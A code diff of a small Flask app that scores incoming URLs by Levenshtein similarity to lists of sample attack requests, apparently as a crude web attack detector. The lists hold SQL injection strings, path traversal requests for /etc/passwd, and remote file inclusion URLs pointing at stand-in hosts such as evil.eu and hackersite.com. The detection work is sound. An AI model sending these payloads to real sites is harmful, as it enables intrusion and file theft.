@@ -14,9 +14,13 @@ import re
 #implement an api where burak can send request and compare between string he sent and my array of levensthain distance
 
 app = Flask(__name__)
-examplarInj = ["/core/files/js/upload.js/?id=0%20or%201=1", "/xmlrpc.php/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1" ]
-examplarPT = ["/core/files/js/upload.js/?id=0%20or%201=1", "/xmlrpc.php/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1" ]
-examplarXss =  ["/core/files/js/upload.js/?id=0%20or%201=1", "/xmlrpc.php/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1" ]
+examplarInj = ["/core/files/js/upload.js/?id=0%20or%201=1", "/xmlrpc.php/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/api/v1/login/?id=0%20or%201=1", "/?customerId=1OR%201=1" ]
+
+
+examplarLfi = ["/core/themes/theme.inc/?page=/../../../../../../etc/passwd", "/blog/better-products-for-2019/../../../file:///etc/passwd?", "//core/files/js/editor.js/../../../file:///etc/passwd?", "/login.php/../../../file:///etc/passwd?" ]
+
+
+examplarXss =  ["/cgi-bin/count.cgi/?file=http://evil.eu/root.asp", "/xmlrpc.php/?post=%3script>alert(1);", "/core/files/js/editor.js/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?", "/xmlrpc.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php" ]
 
 @app.route('/analyze')
 def analyze():
@@ -36,8 +40,8 @@ def compareAgainst(url):
     for element in examplarInj:
         Distance = levenshtein_ratio_and_distance(url, element, ratio_calc=True)
         sum += Distance
-
-    return Distance
+    # Distance = levenshtein_ratio_and_distance(url, examplarInj[0], ratio_calc=True)
+    return sum/4.0
 
 
 def levenshtein_ratio_and_distance(s, t, ratio_calc = False):
@@ -77,13 +81,5 @@ def levenshtein_ratio_and_distance(s, t, ratio_calc = False):
 
         return "{} away".format(distance[row][col])
 
-
-
-#
-# Str2 = "/index.php/?id=0%20or%201=1"
-# Distance = levenshtein_ratio_and_distance(Str1, Str2)
-# print(Distance)
-# Ratio = levenshtein_ratio_and_distance(Str1, Str2,ratio_calc = True)
-# print(Ratio)
 
 
